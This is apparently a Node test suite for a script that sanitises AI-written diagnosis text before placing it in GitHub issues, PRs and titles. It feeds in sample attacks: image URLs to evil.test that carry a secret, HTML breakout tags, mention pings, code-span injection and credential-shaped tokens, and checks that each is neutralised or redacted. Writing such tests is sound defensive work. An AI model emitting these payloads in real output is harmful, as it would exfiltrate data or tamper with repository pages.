// PR/issue bodies carry text written by a model that read untrusted robot logs.
import assert from "node:assert/strict";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, it } from "node:test";
import { node, tempDir } from "./helpers.mjs";

const ZWSP = "​";
const ENV = { SIGNATURE: "abc123def456", RUN_URL: "https://example.test/run/1", JOB_KEY: "a1000000-0000-4000-8000-000000000001", PROCESS_KEY: "InvoiceBot", ORCHESTRATOR_URL: "" };

const diagnosis = (over = {}) => ({
  is_code_fix: true,
  confidence: "high",
  root_cause: "Selector changed.",
  evidence: [],
  proposed_changes: [],
  summary_md: "",
  ...over,
});

function render(kind, files) {
  const dir = tempDir();
  for (const [name, content] of Object.entries(files)) writeFileSync(join(dir, name), typeof content === "string" ? content : JSON.stringify(content));
  const r = node("render-body.mjs", [kind, dir], { env: ENV });
  assert.equal(r.code, 0, r.err);
  return r.out;
}

describe("render-body.mjs", () => {
  it("keeps Markdown and HTML images in model text from rendering", () => {
    const body = render("issue", {
      "diagnose.json": diagnosis({
        root_cause: "See ![x](https://evil.test/?d=secret) and <img src='https://evil.test/a.png'>",
        summary_md: "![ref][r]\n\n[r]: https://evil.test/b.png\n<IMG SRC=x><picture><source srcset=y></picture>",
        non_code_actions: ["![again](https://evil.test/c)"],
      }),
    });
    assert.doesNotMatch(body, /!\[/, "no image syntax survives");
    assert.doesNotMatch(body, /<(img|picture|source)\b/i, "no raw image tags survive");
    assert.ok(body.includes(`!${ZWSP}[x](https://evil.test/?d=secret)`), "the text itself is still shown");
  });

  it("neutralises raw HTML that would break out of the script's own structure", () => {
    const body = render("issue", { "diagnose.json": diagnosis({ summary_md: "</details><details open><summary>x</summary>" }) });
    assert.equal((body.match(/<details>/g) ?? []).length, 1, "only the script's own <details>");
    assert.equal((body.match(/<\/details>/g) ?? []).length, 1);
  });

  it("leaves XAML and selector snippets readable", () => {
    const xaml = '<Assign DisplayName="Set poNumber" />';
    const body = render("pr", {
      "diagnose.json": diagnosis({ summary_md: `Before:\n\n\`\`\`xml\n${xaml}\n\`\`\`\n\nSelector \`<webctrl id='btnSubmit' />\`.` }),
      "fix.json": { applied: true, files_changed: ["Main.xaml"], summary: "Added a null check.", caveats: [] },
    });
    const visible = body.replaceAll(ZWSP, "");
    assert.ok(visible.includes(xaml));
    assert.ok(visible.includes("`<webctrl id='btnSubmit' />`"));
    assert.ok(visible.includes("```xml"));
  });

  it("defuses mentions", () => {
    const body = render("issue", { "diagnose.json": diagnosis({ root_cause: "ping @octocat and @org/team" }) });
    assert.doesNotMatch(body, /@octocat|@org\/team/);
    assert.ok(body.includes(`@${ZWSP}octocat`));
  });

  it("keeps values it wraps in code spans on one line and inside the span", () => {
    const body = render("issue", {
      "diagnose.json": diagnosis({
        evidence: [{ source: "jobs-logs.json` ![x](https://evil.test)\n# heading", datum: "boom" }],
        proposed_changes: [{ file: "Main.xaml`\n- injected", change: "fix it" }],
      }),
    });
    assert.ok(body.includes("- `jobs-logs.json' !​[x](https://evil.test) # heading`: boom"));
    assert.ok(body.includes("- `Main.xaml' - injected`: fix it"));
  });

  it("redacts credential-shaped strings", () => {
    const jwt = `eyJ${"a".repeat(20)}.${"b".repeat(20)}.${"c".repeat(20)}`;
    const body = render("issue", {
      "diagnose.json": diagnosis({ summary_md: `token ${jwt} key sk-ant-api03-${"x".repeat(30)} pat ghp_${"A".repeat(36)} UIPATH_CLIENT_SECRET=hunter2` }),
    });
    assert.ok(!body.includes(jwt));
    assert.match(body, /\[REDACTED_JWT\]/);
    assert.match(body, /\[REDACTED_ANTHROPIC_KEY\]/);
    assert.match(body, /\[REDACTED_GITHUB_TOKEN\]/);
    assert.match(body, /UIPATH_CLIENT_SECRET=\[REDACTED\]/);
    assert.ok(!body.includes("hunter2"));
  });

  it("keeps validation output inside its fence", () => {
    const body = render("issue", {
      "diagnose.json": diagnosis(),
      "validation.txt": "rejected: evil.ps1: file type not allowed\n```\n![x](https://evil.test)\n",
    });
    assert.match(body, /### Why there is no PR/);
    assert.equal((body.match(/^```$/gm) ?? []).length, 2, "exactly the opening and closing fence");
    assert.doesNotMatch(body, /!\[/);
  });

  it("renders a repeat-fault comment without a diagnosis", () => {
    const body = render("comment", { "decision.json": { decision: { reason: "needs_code_fix 0.91 → fix · sonnet" } } });
    assert.match(body, /Seen again/);
    assert.ok(body.includes("`abc123def456`"));
    assert.ok(body.includes("Jev: needs_code_fix 0.91 → fix · sonnet"));
  });

  it("says so when no diagnosis was produced", () => {
    const body = render("issue", {});
    assert.match(body, /No diagnosis was produced/);
    assert.ok(body.includes("<!-- autofix-signature: abc123def456 -->"));
  });

  it("does not trust the type of any field that came through the claude job", () => {
    const body = render("pr", {
      "diagnose.json": diagnosis({ evidence: "not a list", proposed_changes: [null, "text", { file: 1, change: 2 }], non_code_actions: { a: 1 }, unverified_observations: 7 }),
      "diagnose-run.json": { num_turns: "![x](https://evil.test)", total_cost_usd: "1.5" },
      "fix-run.json": { num_turns: 12, total_cost_usd: 0.25 },
      "fix.json": { applied: true, files_changed: "x", summary: "Done.", caveats: "not a list" },
      "decision.json": { decision: { model: "claude-sonnet-5-5" }, summary_md: "### Jev routing: `InvoiceBot`\n" },
    });
    assert.doesNotMatch(body, /!\[/);
    assert.ok(body.includes("| diagnose | `claude-sonnet-5-5` | ? | $0.000 |"), "a non-numeric turn count and cost fall back");
    assert.ok(body.includes("| fix | `claude-sonnet-5-5` | 12 | $0.250 |"));
    assert.ok(body.includes("| **total** | | | **$0.250** |"));
    assert.ok(body.includes("- `1`: 2"), "the one well-formed change is still listed");
    assert.ok(body.includes("#### Jev routing: `InvoiceBot`"), "the verified triage summary is embedded as written");
  });

  it("scrubs the routing line it quotes in a comment", () => {
    const body = render("comment", { "decision.json": { decision: { reason: "ok ![x](https://evil.test) <img src=x> @octocat" } } });
    assert.doesNotMatch(body, /!\[|<img|@octocat/);
  });

  it("renders one scrubbed, redacted line for titles and commit subjects", () => {
    const title = render("title", {
      "diagnose.json": diagnosis({ root_cause: `Selector changed, fixes #12, ping @octocat, key sk-ant-api03-${"x".repeat(30)} and more text that runs on\nsecond line` }),
    });
    assert.doesNotMatch(title, /\n/);
    assert.ok(title.length <= 72, `${title.length} chars`);
    assert.doesNotMatch(title, /sk-ant-|#12|@octocat/);
    assert.match(title, /^Selector changed, fixes #​12, ping @​octocat, key \[REDACTED_ANTHROPIC/);
    assert.equal(render("title", {}), "", "empty without a diagnosis, so the caller falls back to the job key");
  });

  it("renders the run summary with the same scrub and redaction", () => {
    const md = render("diagnosis-summary", {
      "diagnose.json": diagnosis({ confidence: "high", root_cause: `See ![x](https://evil.test) @octocat sk-ant-api03-${"x".repeat(30)}` }),
    });
    assert.match(md, /^### Claude diagnosis/);
    assert.match(md, /\*\*high\*\* · code fix: \*\*true\*\*/);
    assert.doesNotMatch(md, /!\[|@octocat|sk-ant-/);
    assert.equal(render("diagnosis-summary", {}), "");
  });
});
